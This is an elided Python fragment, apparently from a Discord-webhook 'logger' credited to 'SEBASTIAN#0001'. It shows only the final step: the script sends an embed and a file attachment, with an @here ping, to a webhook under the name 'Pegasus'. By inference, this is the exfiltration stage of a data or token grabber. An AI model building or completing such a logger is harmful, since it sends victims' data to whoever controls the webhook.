...
def main(webhook_url):
	...
	embed.set_footer(text="Logger Made by SEBASTIAN#0001")
	embed.set_thumbnail(url="https://media.discordapp.net/attachments/798245111070851105/930314565454004244/IMG_2575.jpg")
	...
	webhook.send(content="||@here||", embed=embed, file=file, avatar_url="https://media.discordapp.net/attachments/798245111070851105/930314565454004244/IMG_2575.jpg", username="Pegasus")
